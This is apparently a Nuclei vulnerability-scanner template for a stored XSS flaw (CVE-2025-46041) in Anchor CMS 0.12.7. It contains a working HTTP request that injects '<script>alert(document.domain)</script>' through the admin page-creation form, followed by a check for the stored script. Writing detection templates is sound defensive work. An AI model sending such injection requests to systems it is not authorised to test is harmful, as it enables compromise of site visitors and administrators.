id: CVE-2025-46041

info:
  name: Anchor CMS 0.12.7 Stored XSS
  author: ProjectDiscoveryAI
  severity: medium
  description: |
    Anchor CMS v0.12.7 suffers from a stored Cross-Site Scripting (XSS) vulnerability in the `markdown` field of the /admin/pages/add page. An authenticated user with page creation privileges can inject arbitrary JavaScript, which is stored and executed when the page is viewed.
  tags: xss,stored,anchorcms

http:
  - raw:
      - |
        POST /admin/pages/add HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Cookie: {{cookie}}
        Content-Length: {{content_length}}

        title=Test&slug=test&markdown=<script>alert(document.domain)</script>&status=published

    extractors:
      - type: regex
        name: page_id
        internal: true
        part: header
        regex:
          - 'Location:.*?/admin/pages/edit/(\d+)' # Extract page ID from redirection header

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 302
      - type: regex
        part: header
        regex:
          - "Location:.*?/admin/pages/edit/"

  - raw:
      - |
        GET /admin/pages/edit/{{page_id}} HTTP/1.1
        Host: {{Hostname}}
        Cookie: {{cookie}}
        Accept: text/html

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "<script>alert(document.domain)</script>"
      - type: word
        part: header
        words:
          - "text/html"
